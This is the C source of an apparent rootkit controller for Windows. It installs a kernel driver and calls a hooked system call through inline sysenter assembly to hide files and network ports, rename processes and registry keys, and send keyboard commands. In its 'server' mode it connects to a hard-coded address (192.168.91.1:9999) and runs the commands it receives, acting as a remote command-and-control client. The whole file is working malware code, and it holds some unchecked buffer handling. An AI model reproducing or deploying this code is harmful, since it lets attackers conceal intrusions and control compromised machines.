#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <stdio.h>
#include ".\..\command.h"
#include "install_driver.h"


#pragma comment(lib, "Ws2_32.lib")

#define sysenter __asm _emit 0x0F __asm _emit 0x34
#define SIGNATURE_SYSCALL 0xBAD0FACE
#define DRIVER_NAME "driver"
#define DRIVER_FILE "Driver.sys"

int InitSocket();
int ConnectToServer();
char* RecvCommand();
int RecvAll(char* buf, unsigned int* len);
void SendOK();
void SendFail();
int GetCommand(const char* payload_string, PCOMMAND payload, int* has_result);
void GetTestCommand(const char* to_parse, PCOMMAND cmd);
void GetRpidCommand(const char* to_parse, PCOMMAND cmd);
void GetRnameCommand(const char* to_parse, PCOMMAND cmd);
void GethFileCommand(const char* to_parse, PCOMMAND cmd);
void GetKeyCommand(const char* to_parse, PCOMMAND cmd);
void GetNetSrcCommand(const char* to_parse, PCOMMAND cmd);
void GetNetDstCommand(const char* to_parse, PCOMMAND cmd);
void GetKeyboardCommand(const char* to_parse, PCOMMAND cmd);


SOCKET socketServer;

unsigned int AddressSystemCall;
__declspec(naked) void FastSystemCall(void) {
	__asm mov edx, esp
	__asm sysenter
}
__declspec(naked) void SysCall(void) {
	//__asm mov eax, <id>
	__asm mov edx, offset AddressSystemCall
	__asm call dword ptr[edx]
	__asm ret
}

int main(int argc, char* argv[]) {
	if (argc > 1) {

		COMMAND cmd;
		unsigned int len;
		memset(&cmd, 0, sizeof(COMMAND));

		// START CLIENT
		if (!strcmp(argv[1], "server")) {
			unsigned char* command;
			if (InitSocket() != 0) {
				return 1;
			}
			if (ConnectToServer() != 0) {
				return 1;
			}
			while (1) {
				int has_result = 0;
				puts("waiting for command...");
				command = RecvCommand();
				printf("cmd recved: %s\n", command);
				if (GetCommand(command, &cmd, &has_result) != 0) {
					return 1;
				}
				__asm {
					push 0
					push 0
					lea eax, cmd
					push eax
					push SIGNATURE_SYSCALL
					mov eax, 0x26
				}
				AddressSystemCall = (unsigned int)FastSystemCall;
				SysCall();
			}
		}
		// TEST SYSCALL
		else if (!strcmp(argv[1], "0x26")) {
			cmd.flags = COMMAND_TEST_COMMAND;
			cmd.target = NULL;
			cmd.change = NULL;
			__asm {
				push 0
				push 0
				lea eax, cmd
				push eax
				push SIGNATURE_SYSCALL
				mov eax, 0x26
			}
			AddressSystemCall = (unsigned int)FastSystemCall;
			SysCall();
		}
		// RENAME PROCESS PID
		else if (!strcmp(argv[1], "rpid")) {
			if (argc == 4) {
				len = strlen(argv[3]);
				cmd.change = malloc(len);
				strcpy((char*)cmd.change, argv[3]);

				cmd.target = (void*)strtoul(argv[2], NULL, 0);
				cmd.flags = COMMAND_RENAME_PROCESS | COMMAND_BUFFER_NUMBER;

				__asm {
					push 0
					push 0
					lea eax, cmd
					push eax
					push SIGNATURE_SYSCALL
					mov eax, 0x26
				}
				AddressSystemCall = (unsigned int)FastSystemCall;
				SysCall();
			}
			else printf("Error rename process\n");
		}
		// RENAME PROCESS NAME
		else if (!strcmp(argv[1], "rname")) {
			if (argc == 4) {
				len = strlen(argv[2]);
				cmd.target = malloc(len);
				strcpy((char*)cmd.target, argv[2]);

				len = strlen(argv[3]);
				cmd.change = malloc(len);
				strcpy((char*)cmd.change, argv[3]);

				cmd.flags = COMMAND_RENAME_PROCESS | COMMAND_BUFFER_POINTER;

				__asm {
					push 0
					push 0
					lea eax, cmd
					push eax
					push SIGNATURE_SYSCALL
					mov eax, 0x26
				}
				AddressSystemCall = (unsigned int)FastSystemCall;
				SysCall();
			}
			else printf("Error rename process\n");
		}
		// HIDE FILE
		else if (!strcmp(argv[1], "hfile")) {
			if (argc == 3) {
				len = strlen(argv[2]);
				cmd.target = malloc(len);
				strcpy((char*)cmd.target, argv[2]);

				cmd.flags = COMMAND_HIDE_FILE | COMMAND_BUFFER_POINTER;

				cmd.change = NULL;
				__asm {
					push 0
					push 0
					lea eax, cmd
					push eax
					push SIGNATURE_SYSCALL
					mov eax, 0x26
				}
				AddressSystemCall = (unsigned int)FastSystemCall;
				SysCall();
			}
			else printf("Error hide file\n");
		}
		// RENAME KEY
		else if (!strcmp(argv[1], "key")) {
			if (argc == 4) {
				len = strlen(argv[2]);
				cmd.target = malloc(len);
				strcpy((char*)cmd.target, argv[2]);

				len = strlen(argv[3]);
				cmd.change = malloc(len);
				strcpy((char*)cmd.change, argv[3]);

				cmd.flags = COMMAND_RENAME_KEY | COMMAND_BUFFER_POINTER;

				__asm {
					push 0
					push 0
					lea eax, cmd
					push eax
					push SIGNATURE_SYSCALL
					mov eax, 0x26
				}
				AddressSystemCall = (unsigned int)FastSystemCall;
				SysCall();
			}
			else printf("Error hide add key\n");
		}
		// ADD NET
		else if (!strcmp(argv[1], "net")) {
			if (argc > 1) {
				if (!strcmp(argv[2], "dst")) {
					cmd.flags = COMMAND_HIDE_NET | COMMAND_BUFFER_DST_PORT;
				}
				else if (!strcmp(argv[2], "src")) {
					cmd.flags = COMMAND_HIDE_NET | COMMAND_BUFFER_SRC_PORT;
				}
				cmd.target = (void*)strtoul(argv[3], NULL, 0);
				cmd.change = NULL;
				__asm {
					push 0
					push 0
					lea eax, cmd
					push eax
					push SIGNATURE_SYSCALL
					mov eax, 0x26
				}
				AddressSystemCall = (unsigned int)FastSystemCall;
				SysCall();
			}
		}
		// COMMAND KEYBOARD
		else if (!strcmp(argv[1], "kb")) {
			if (argc == 3) {
				cmd.flags = COMMAND_KEYBOARD | COMMAND_BUFFER_POINTER;
				len = strlen(argv[2]);
				cmd.change = (void*)len;

				cmd.target = malloc(len);
				strcpy(cmd.target, argv[2]);

				__asm {
					push 0
					push 0
					lea eax, cmd
					push eax
					push SIGNATURE_SYSCALL
					mov eax, 0x26
				}
				AddressSystemCall = (unsigned int)FastSystemCall;
				SysCall();
			}
		}
		// START DRIVER
		else if (!strcmp(argv[1], "start")) {
			char buf[2 * MAX_PATH];

			GetFullPathNameA(DRIVER_FILE, 2 * MAX_PATH, buf, NULL);

			if (!InstallDriver(DRIVER_NAME, buf))
				return 0;
			if (!StartDriver(DRIVER_NAME))
				return 0;

		}
		// STOP DRIVER
		else if (!strcmp(argv[2], "stop")) {

			if (!StopDriver(DRIVER_NAME))
				return 0;
			if (!RemoveDriver(DRIVER_NAME))
				return 0;

			printf("Driver unload");
		}
	}

	return 0;
}

int InitSocket() {
	WSADATA wsa;
	int error = WSAStartup(MAKEWORD(2, 2), &wsa);
	if (error != 0) {
		printf("Error on WSAStartup()");
	}
	return error;
}

int ConnectToServer() {
	struct sockaddr_in server;
	if ((socketServer = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET) {
		printf("Could not create socket : %d.\n", WSAGetLastError());
		WSACleanup();
		return 1;
	}
	printf("Socket created. Connecting...\n");
	memset(&server, 0, sizeof server);
	server.sin_addr.s_addr = inet_addr("192.168.91.1");
	server.sin_family = AF_INET;
	server.sin_port = htons(9999);

	//Connect to remote server
	if (connect(socketServer, (struct sockaddr*)&server, sizeof(server)) < 0) {
		printf("Connect error:%d.\nPress a key to exit...", WSAGetLastError());
		closesocket(socketServer);
		WSACleanup();
		return 1;
	}

	puts("Connected");
	return 0;
}

char* RecvCommand() {
	char buffer_for_size[4] = { 0 };
	unsigned int exact_size = 4;
	char* command = NULL;
	if (RecvAll(buffer_for_size, &exact_size) != 0) {
		return "";
	}
	exact_size = (buffer_for_size[3] << 24) + (buffer_for_size[2] << 16) + (buffer_for_size[1] << 8) + buffer_for_size[0];
	SendOK();
	command = (char*)malloc(exact_size);
	if (RecvAll(command, &exact_size) != 0) {
		return "";
	}
	SendOK();
	command[exact_size] = 0;
	return command;
}

void SendOK() {
	send(socketServer, "OK", 2, 0);
}

void SendFail() {
	send(socketServer, "fail", 4, 0);
}

int RecvAll(char* buf, unsigned int* len) {
	int total = 0;        // how many bytes we've received
	int bytesleft = *len; // how many we have left to receive
	int n = -1;

	while ((unsigned int)total < *len) {
		n = recv(socketServer, buf + total, bytesleft, 0);
		if (n <= 0) { break; }
		total += n;
		bytesleft -= n;
	}

	*len = total; // return number actually received here

	return (n <= 0) ? -1 : 0; // return -1 on failure, 0 on success
}

int GetCommand(const char* payload_string, PCOMMAND payload, int* has_result) {
	unsigned int len_of_command = 0;
	char* first_command = NULL;
	unsigned int i = 0;
	for (; payload_string[i] != '\0'; i++) {
		if (payload_string[i] == ' ') {
			len_of_command = i;
			break;
		}
	}
	if (len_of_command == 0) {
		len_of_command = i;
	}

	first_command = (char*)malloc(len_of_command + 1);
	memcpy(first_command, payload_string, len_of_command);
	first_command[len_of_command] = 0;

	if (!strcmp(first_command, "0x26")) {
		printf("test 0x26\n");
		payload_string = payload_string + len_of_command + 1;
		GetTestCommand(payload_string, payload);
		goto end_label;
	}
	else if (!strcmp(first_command, "rpid")) {
		payload_string = payload_string + len_of_command + 1;
		GetRpidCommand(payload_string, payload);
		goto end_label;
	}
	else if (!strcmp(first_command, "rname")) {
		payload_string = payload_string + len_of_command + 1;
		GetRnameCommand(payload_string, payload);
		*has_result = 1;
		goto end_label;
	}
	else if (!strcmp(first_command, "hfile")) {
		payload_string = payload_string + len_of_command + 1;
		GethFileCommand(payload_string, payload);
		goto end_label;
	}
	else if (!strcmp(first_command, "key")) {
		payload_string = payload_string + len_of_command + 1;
		GetKeyCommand(payload_string, payload);
		goto end_label;
	}
	else if (!strcmp(first_command, "net_src")) {
		payload_string = payload_string + len_of_command + 1;
		GetNetSrcCommand(payload_string, payload);
		goto end_label;
	}
	else if (!strcmp(first_command, "net_dst")) {
		payload_string = payload_string + len_of_command + 1;
		GetNetDstCommand(payload_string, payload);
		goto end_label;
	}
	else if (!strcmp(first_command, "kb")) {
		payload_string = payload_string + len_of_command + 1;
		GetKeyboardCommand(payload_string, payload);
		goto end_label;
	}
	return -1;

end_label:
	free(first_command);
	return 0;
}

void GetTestCommand(const char* to_parse, PCOMMAND cmd) {
	cmd->target = NULL;
	cmd->change = NULL;
	cmd->flags = COMMAND_TEST_COMMAND;
}

void GetRpidCommand(const char* to_parse, PCOMMAND cmd) {
	cmd->change = malloc(100);

	if (isdigit(to_parse[0]) != 0) {
		sscanf(to_parse, "%d %s", &(unsigned int)cmd->target, (char*)cmd->change);
		cmd->flags = COMMAND_BUFFER_NUMBER | COMMAND_RENAME_PROCESS;
	}
}

void GetRnameCommand(const char* to_parse, PCOMMAND cmd) {
	cmd->change = malloc(100);
	cmd->target = malloc(100);

	sscanf(to_parse, "%s %s", (char*)cmd->target, (char*)cmd->change);
	cmd->flags = COMMAND_BUFFER_POINTER | COMMAND_RENAME_PROCESS;
}

void GethFileCommand(const char* to_parse, PCOMMAND cmd) {
	cmd->target = malloc(100);

	sscanf(to_parse, "%s", (char*)cmd->target);
	cmd->change = NULL;
	cmd->flags = COMMAND_BUFFER_POINTER | COMMAND_HIDE_FILE;
}

void GetKeyCommand(const char* to_parse, PCOMMAND cmd) {
	cmd->target = malloc(100);
	cmd->change = malloc(100);

	sscanf(to_parse, "%s %s", (char*)cmd->target, (char*)cmd->change);
	cmd->flags = COMMAND_BUFFER_POINTER | COMMAND_RENAME_KEY;
}

void GetNetSrcCommand(const char* to_parse, PCOMMAND cmd) {
	sscanf(to_parse, "%d", &(unsigned int)cmd->target);
	cmd->change = NULL;
	cmd->flags = COMMAND_BUFFER_SRC_PORT | COMMAND_HIDE_NET;
}

void GetNetDstCommand(const char* to_parse, PCOMMAND cmd) {
	sscanf(to_parse, "%d", &(unsigned int)cmd->target);
	cmd->change = NULL;
	cmd->flags = COMMAND_BUFFER_DST_PORT | COMMAND_HIDE_NET;
}


void GetKeyboardCommand(const char* to_parse, PCOMMAND cmd) {
	cmd->target = malloc(100);
	strcpy((char*)cmd->target, to_parse);
	//sscanf(to_parse, "%s", (char*)cmd->target);
	cmd->change = (void*)strlen((char*)cmd->target);
	cmd->flags = COMMAND_KEYBOARD | COMMAND_BUFFER_POINTER;

}